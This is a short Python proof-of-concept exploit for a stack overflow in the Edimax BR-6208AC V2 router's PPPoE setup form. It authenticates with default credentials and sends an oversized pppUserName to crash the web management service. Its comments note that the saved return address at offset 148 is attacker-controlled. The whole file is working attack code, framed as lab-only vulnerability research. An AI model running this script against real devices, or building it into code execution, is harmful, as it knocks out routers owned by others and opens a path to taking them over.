#!/usr/bin/env python3
# Edimax BR-6208AC V2 (fw 1.03) formPPPoESetup pppUserName stack overflow — PoC
# Non-destructive: crashes the web management process (no config is committed to flash
# before the crash). Recovery: power-cycle the device. Run only against lab devices.
import sys, urllib.request, urllib.parse, base64

target = sys.argv[1] if len(sys.argv) > 1 else "192.168.2.1"
userpass = sys.argv[2] if len(sys.argv) > 2 else "admin:1234"
base = f"http://{target}"
auth = "Basic " + base64.b64encode(userpass.encode()).decode()

def get(path):
    req = urllib.request.Request(base + path, headers={"Authorization": auth})
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code

def alive():
    try:
        urllib.request.urlopen(base + "/", timeout=5)
        return True
    except Exception:
        return False

print(f"[*] baseline: GET / -> {get('/')}")
payload = urllib.parse.urlencode({"pppUserName": "A" * 160}).encode()
req = urllib.request.Request(base + "/goform/formPPPoESetup", data=payload,
                             headers={"Authorization": auth})
print("[*] sending pppUserName = 'A' * 160 (crash threshold: >152 bytes reaches saved $ra @ buf+148)")
try:
    with urllib.request.urlopen(req, timeout=8) as r:
        print(f"    http={r.status}")
except Exception as e:
    print(f"    request ended: {e}")

import time; time.sleep(2)
if alive():
    print("[-] web server still alive (not vulnerable / different build)")
else:
    print("[+] web server is DEAD — stack overflow executed, persistent DoS confirmed")
    print("    (saved $ra at offset 148 is attacker-controlled; see README for the De Bruijn proof)")
